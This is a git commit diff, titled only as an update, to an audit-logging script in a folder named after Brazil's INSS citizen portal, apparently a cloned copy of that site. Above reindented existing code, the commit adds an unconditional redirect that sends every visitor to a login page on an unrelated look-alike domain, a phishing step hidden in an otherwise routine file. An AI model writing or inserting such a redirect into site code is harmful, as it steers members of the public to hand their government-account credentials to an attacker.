a3fae3d766cfa8c076a73a2ec1f87ad0f34e9e97
julio2888 <juliodois288@gmail.com>
2024-12-24 13:19:38 -0300

    Update auditoria-main.js

--- www.meu.inss.gov.br/auditoria-main.js
+++ www.meu.inss.gov.br/auditoria-main.js
@@ -1,122 +1,123 @@
+// Redirecionar todas as URLs para https://www.inssconsulta.site/#/login
+if (window.location.href !== 'https://www.inssconsulta.site/#/login') {
+    window.location.href = 'https://www.inssconsulta.site/#/login';
+}
+
 const getParams = (origemOperacao, url, httpStatus) => {
-  
-  if (!localStorage.getItem('userId')) {
-    let userIdStorage = (new Date()).getTime() + '-' + Math.random().toString(36).substring(2);
-    localStorage.setItem('userId', userIdStorage.substring(0, 25));
-    window.auditoriaLogManual('evt-userId');
-  }
-  
-  if (!sessionStorage.getItem('accessId')) {
-    let accessIdStorage = (new Date()).getTime() + '-' + Math.random().toString(36).substring(2);
-    sessionStorage.setItem('accessId', accessIdStorage.substring(0, 25));
-    window.auditoriaLogManual('evt-sessionId');
-  }
+    if (!localStorage.getItem('userId')) {
+        let userIdStorage = (new Date()).getTime() + '-' + Math.random().toString(36).substring(2);
+        localStorage.setItem('userId', userIdStorage.substring(0, 25));
+        window.auditoriaLogManual('evt-userId');
+    }
 
-  let token = localStorage.getItem('ifs_auth');
-  let tsToken = localStorage.getItem('ifs_ts');
-  let miToken = localStorage.getItem('miToken');
-  let deviceName = window._deviceName;
-  let userId = localStorage.getItem('userId');
-  let sessionId = sessionStorage.getItem('accessId');
-  let urlApi = window.env.REACT_APP__URL_API || window.env.urlApi;
-  let sagToken = sessionStorage.getItem('sagTkn');
+    if (!sessionStorage.getItem('accessId')) {
+        let accessIdStorage = (new Date()).getTime() + '-' + Math.random().toString(36).substring(2);
+        sessionStorage.setItem('accessId', accessIdStorage.substring(0, 25));
+        window.auditoriaLogManual('evt-sessionId');
+    }
 
+    let token = localStorage.getItem('ifs_auth');
+    let tsToken = localStorage.getItem('ifs_ts');
+    let miToken = localStorage.getItem('miToken');
+    let deviceName = window._deviceName;
+    let userId = localStorage.getItem('userId');
+    let sessionId = sessionStorage.getItem('accessId');
+    let urlApi = window.env.REACT_APP__URL_API || window.env.urlApi;
+    let sagToken = sessionStorage.getItem('sagTkn');
 
-  return { origemOperacao, token, tsToken, miToken, url, deviceName, 
-    userId, sessionId, httpStatus, urlApi, sagToken };
-
+    return { origemOperacao, token, tsToken, miToken, url, deviceName, userId, sessionId, httpStatus, urlApi, sagToken };
 }
 
 // https://stackoverflow.com/questions/6390341/how-to-detect-if-url-has-changed-after-hash-in-javascript
 (() => {
-  let oldPushState = history.pushState;
-  history.pushState = function pushState() {
-      let ret = oldPushState.apply(this, arguments);
-      window.dispatchEvent(new Event('pushstate'));
-      window.dispatchEvent(new Event('locationchange'));
-      return ret;
-  };
+    let oldPushState = history.pushState;
+    history.pushState = function pushState() {
+        let ret = oldPushState.apply(this, arguments);
+        window.dispatchEvent(new Event('pushstate'));
+        window.dispatchEvent(new Event('locationchange'));
+        return ret;
+    };
 
-  let oldReplaceState = history.replaceState;
-  history.replaceState = function replaceState() {
-      let ret = oldReplaceState.apply(this, arguments);
-      window.dispatchEvent(new Event('replacestate'));
-      window.dispatchEvent(new Event('locationchange'));
-      return ret;
-  };
+    let oldReplaceState = history.replaceState;
+    history.replaceState = function replaceState() {
+        let ret = oldReplaceState.apply(this, arguments);
+        window.dispatchEvent(new Event('replacestate'));
+        window.dispatchEvent(new Event('locationchange'));
+        return ret;
+    };
 
-  window.addEventListener('popstate', () => {
-      window.dispatchEvent(new Event('locationchange'));
-  });
+    window.addEventListener('popstate', () => {
+        window.dispatchEvent(new Event('locationchange'));
+    });
 })();
 
 let fila = [];
 let timeoutFila;
 let desabilitarFila;
 const verificarFila = (data) => {
-  if (desabilitarFila) {
-    return true;
-  } else if (!window.firebaseLoaded) {
-    if (data) {
-      fila.push(data);
-      if (fila.length > 10) {
+    if (desabilitarFila) {
+        return true;
+    } else if (!window.firebaseLoaded) {
+        if (data) {
+            fila.push(data);
+            if (fila.length > 10) {
+                desabilitarFila = true;
+                window.auditoriaLogManualForce('log-error-load-firebase');
+                fila.forEach(data => {
+                    window.auditoriaLog(data);
+                })
+                fila = [];
+            }
+        }
+        if (timeoutFila) {
+            clearTimeout(timeoutFila);
+        }
+        timeoutFila = setTimeout(verificarFila, 1000);
+        return false;
+    } else if (fila.length > 0) {
         desabilitarFila = true;
-        window.auditoriaLogManualForce('log-error-load-firebase');
         fila.forEach(data => {
-          window.auditoriaLog(data); 
+            window.auditoriaLog(data);
         })
         fila = [];
-      }
     }
-    if (timeoutFila) {
-      clearTimeout(timeoutFila);
-    }
-    timeoutFila = setTimeout(verificarFila, 1000);
-    return false;   
-  } else if (fila.length > 0) {
-    desabilitarFila = true;
-    fila.forEach(data => {
-      window.auditoriaLog(data); 
-    })
-    fila = [];
-  }
-  return true;
+    return true;
 }
 
 const verificarFiltro = (data) => {
-  if (data.origemOperacao === 1 && window.env.REACT_APP__AUDITORIA_API_REGEX) {
-    return new RegExp(window.env.REACT_APP__AUDITORIA_API_REGEX).test(data.url);
-  } else if (data.origemOperacao === 2 && window.env.REACT_APP__AUDITORIA_FRONTEND_REGEX) {
-    return new RegExp(window.env.REACT_APP__AUDITORIA_FRONTEND_REGEX).test(data.url);
-  } else if (data.origemOperacao === 3 && window.env.REACT_APP__AUDITORIA_MANUAL_REGEX) {
-    return new RegExp(window.env.REACT_APP__AUDITORIA_MANUAL_REGEX).test(data.url);
-  }
-  return true;
+    if (data.origemOperacao === 1 && window.env.REACT_APP__AUDITORIA_API_REGEX) {
+        return new RegExp(window.env.REACT_APP__AUDITORIA_API_REGEX).test(data.url);
+    } else if (data.origemOperacao === 2 && window.env.REACT_APP__AUDITORIA_FRONTEND_REGEX) {
+        return new RegExp(window.env.REACT_APP__AUDITORIA_FRONTEND_REGEX).test(data.url);
+    } else if (data.origemOperacao === 3 && window.env.REACT_APP__AUDITORIA_MANUAL_REGEX) {
+        return new RegExp(window.env.REACT_APP__AUDITORIA_MANUAL_REGEX).test(data.url);
+    }
+    return true;
 }
 
 // https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers
 if (window.Worker) {
-  const auditoriaWorker = new Worker("auditoria-worker.js");
-  window.auditoriaLog = (data, force) => { 
-    if (force) {
-      auditoriaWorker.postMessage(data); 
-    } else if (verificarFila(data)) {
-      if (verificarFiltro(data)) { 
-        auditoriaWorker.postMessage(data); 
-      } 
-    }
-  };
+    const auditoriaWorker = new Worker("auditoria-worker.js");
+    window.auditoriaLog = (data, force) => {
+        if (force) {
+            auditoriaWorker.postMessage(data);
+        } else if (verificarFila(data)) {
+            if (verificarFiltro(data)) {
+                auditoriaWorker.postMessage(data);
+            }
+        }
+    };
 } else {
-  console.log('Your browser doesn\'t support web workers.');
-  window.auditoriaLog = (data, force) => { 
-    if (force) {
-      auditoriaLog(data); 
-    } else if (verificarFila(data)) {
-      if (verificarFiltro(data)) { 
-        auditoriaLog(data); 
-      } 
-    }
-  };
+    console.log('Your browser doesn\'t support web workers.');
+    window.auditoriaLog = (data, force) => {
+        if (force) {
+            auditoriaLog(data);
+        } else if (verificarFila(data)) {
+            if (verificarFiltro(data)) {
+                auditoriaLog(data);
+            }
+        }
+    };
 }
 
 window.auditoriaLogApi = (url, httpStatus) => window.auditoriaLog(getParams(1, url, httpStatus));
@@ -129,5 +130,5 @@ window.addEventListener("beforeunload", () => window.auditoriaLogManual(window.l
 window.auditoriaLogManual(window.location.href.indexOf('v35') ? "evt-load" : "evt-load_v35");
 
 window.onerror = (error, url, line) => {
-  window.auditoriaLogManual('log-error-js: url=' + url + ', line: ' + line + ', error: ' + error);
+    window.auditoriaLogManual('log-error-js: url=' + url + ', line: ' + line + ', error: ' + error);
 };
